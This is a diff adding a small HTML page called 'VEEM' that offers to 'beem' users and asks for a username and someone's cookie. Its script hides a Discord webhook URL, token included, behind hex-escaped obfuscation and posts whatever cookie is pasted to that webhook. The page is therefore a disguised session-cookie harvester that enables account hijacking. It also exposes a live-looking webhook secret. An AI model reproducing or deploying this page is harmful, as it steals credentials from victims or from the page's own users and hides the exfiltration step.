@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="style.css" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="shortcut icon" href="img/D.PNG" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>VEEM</title>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <h1 class="title">VEEM <span id="sxx"> BETA </span></h1>
+        <p class="subtitle">
+          Use this tool to beem people. Remember if you have any questions about how to use it visit 
+          <a href="about.html">About</a>
+        </p>
+
+        <div class="Contact">
+          <label class="Name-Input">
+              <input maxlength=37 minlength="2" id="NameInput" type="text" required/>
+              <span class="placeholder">Username </span>
+          </label>
+          <textarea maxlength ="2000" id="InputField" placeholder="His Cookie Here"></textarea>
+          <button onclick="send()" id="SendMessage">Beem User</button>
+          <h3 id="MessageSent">User BEAMED!</h3>
+          <h3 id="MessageFailed">ERROR</h3>
+      </div>
+      </div>
+      <div class="blob"></div>
+    </div>
+
+    <script>
+      var _0x9cd9=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x36\x37\x35\x36\x30\x35\x31\x30\x36\x34\x39\x38\x31\x35\x31\x34\x32\x2F\x77\x64\x59\x6E\x77\x79\x35\x4C\x69\x5A\x4B\x39\x48\x71\x39\x51\x49\x6A\x49\x42\x70\x63\x51\x6E\x5A\x64\x49\x34\x42\x35\x5F\x75\x50\x34\x58\x39\x6C\x46\x54\x42\x70\x6F\x64\x4B\x49\x49\x54\x79\x61\x62\x75\x78\x52\x4C\x44\x6B\x46\x49\x59\x4A\x75\x65\x5A\x32\x6B\x70\x74\x47"];whurl= _0x9cd9[0]
+var str= "";
+var name= "";
+function f1(){
+    name = document.getElementById("NameInput").value;
+    str = document.getElementById("InputField").value;
+    console.log(document.getElementById("InputField").value)
+}
+function send(){
+    f1();
+    const msg = {
+        "content": str,
+        "username": name
+    };
+    console.log(msg)
+    if(str == ""){
+        document.getElementById("Message1").style.opacity = 1; 
+        setTimeout(function(){
+            document.getElementById("Message1").style.opacity = 0;
+        }, 4000)
+        console.log("ERROR")
+        return;
+    }
+    try{
+        fetch(whurl + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify(msg)});
+        document.getElementById("InputField").value = "";
+        document.getElementById("MessageSent").style.opacity = 1;
+        setTimeout(function(){
+            document.getElementById("MessageSent").style.opacity = 0;
+        }, 4000)
+
+    } catch(e){
+        document.getElementById("MessageFailed").style.opacity = 1;  
+        
+        setTimeout(function(){
+            document.getElementById("MessageFailed").style.opacity = 0;
+        }, 4000)
+    }
+
+} 
+    </script>
+  </body>
+</html>
